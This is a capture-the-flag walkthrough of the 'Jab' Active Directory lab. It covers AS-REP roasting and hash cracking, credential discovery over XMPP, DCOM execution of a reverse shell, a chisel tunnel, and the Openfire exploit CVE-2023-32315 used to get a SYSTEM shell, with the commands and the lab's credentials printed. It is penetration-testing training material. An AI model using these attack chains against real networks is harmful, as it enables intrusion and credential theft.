# 🧠 Jab - Active Directory Exploitation Walkthrough

**Jab** is an Active Directory lab environment that involves:

- Kerberos user enumeration and AS-REP Roasting
- XMPP-based information gathering using Openfire and Pidgin
- Lateral movement through DCOM-based privilege escalation
- RCE via CVE-2023-32315 on Openfire admin
- Full Domain Admin compromise

---

## 🚩 Highlights

| Phase              | Tools & Techniques                                                                 |
|--------------------|-------------------------------------------------------------------------------------|
| User Enum          | `kerbrute`, `GetNPUsers`, AS-REP roasting                                          |
| Password Cracking  | `hashcat` with mode 18200                                                          |
| XMPP Discovery     | `Pidgin` XMPP client to uncover user info and chat rooms                           |
| SMB Enum           | `smbmap` with valid credentials for share access                                   |
| AD Enumeration     | `bloodhound-python`, `Neo4j`, AD Object analysis                                   |
| Lateral Movement   | `impacket-dcomexec` for executing payloads via DCOM                                |
| Pivot              | `chisel` for port forwarding to Openfire admin interface                           |
| Final Exploit      | `CVE-2023-32315` on Openfire to gain SYSTEM shell via plugin upload                |

---

## 📌 Target Overview

- **IP Address:** `10.10.11.4`
- **Domain:** `jab.htb`
- **DC Hostname:** `dc01.jab.htb`
- **Key Services:** Kerberos, LDAP, SMB, Openfire (XMPP)

---

## 🔍 Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA nmap 10.10.11.4
Discovered Ports:

88, 389, 636, 445 – Kerberos, LDAP, SMB

5222, 5269, 7070, 7443, 7777 – XMPP (Openfire)

Update /etc/hosts:

Copy
Edit
10.10.11.4 jab.htb dc01.jab.htb
🔐 Kerberos + AS-REP Roasting
User Enumeration
bash
Copy
Edit
kerbrute userenum --dc dc01.jab.htb -d jab.htb usernames.txt -o kerbrute.txt
AS-REP Dumping
bash
Copy
Edit
GetNPUsers jab.htb/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
Cracking Hashes
bash
Copy
Edit
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
Found:

yaml
Copy
Edit
jmontgomery : Midnight_121
💬 XMPP Chat Discovery via Pidgin
Logged into Openfire using jmontgomery

Found chat messages with new creds:

yaml
Copy
Edit
svc_openfire : !@#$%^&*(1qazxsw)
🧰 BloodHound & AD Privilege Path
Dump AD Objects
bash
Copy
Edit
bloodhound-python -u svc_openfire -p '!@#$%^&*(1qazxsw)' -d jab.htb -dc dc01.jab.htb -c all -ns 10.10.11.4
Upload results to BloodHound

Discovered svc_openfire has DCOM execution rights on DC

🎯 DCOM Remote Code Execution
Execute Reverse Shell
bash
Copy
Edit
impacket-dcomexec 'jab.htb/svc_openfire:!@#$%^&*(1qazxsw)@dc01.jab.htb' '<powershell payload>'
Netcat Listener
bash
Copy
Edit
rlwrap nc -nlvp 6658
✅ User Flag: 58b27f9faaec3dfdb2a94dad6a1e2175

🔀 Port Forwarding with Chisel
Setup Reverse Tunnel
Attacker:

bash
Copy
Edit
chisel server -p 9999 --reverse
Victim (DC):

bash
Copy
Edit
chisel client <YourIP>:9999 R:9090:127.0.0.1:9090
Access Openfire admin: http://127.0.0.1:9090

💣 Openfire RCE (CVE-2023-32315)
Setup Exploit
bash
Copy
Edit
git clone https://github.com/miko550/CVE-2023-32315.git
cd CVE-2023-32315
pip3 install -r requirements.txt
Upload malicious plugin through Openfire Admin

Trigger payload for SYSTEM shell

Final Reverse Shell
bash
Copy
Edit
rlwrap nc -nlvp 4444
✅ Root Flag: 8f826f76eb871e0566058e6580760e8e

🛠️ Tools Used
nmap, kerbrute, hashcat, impacket

bloodhound-python, Neo4j, smbmap, Pidgin

chisel, rlwrap, CVE-2023-32315 exploit

✅ Summary
Initial foothold via AS-REP roasting

Credential chaining through XMPP and SMB

BloodHound revealed DCOM attack path

Gained remote shell on Domain Controller

Privilege escalation via internal Openfire RCE

🧑‍💻 Author
Farhanahmad Quraishi
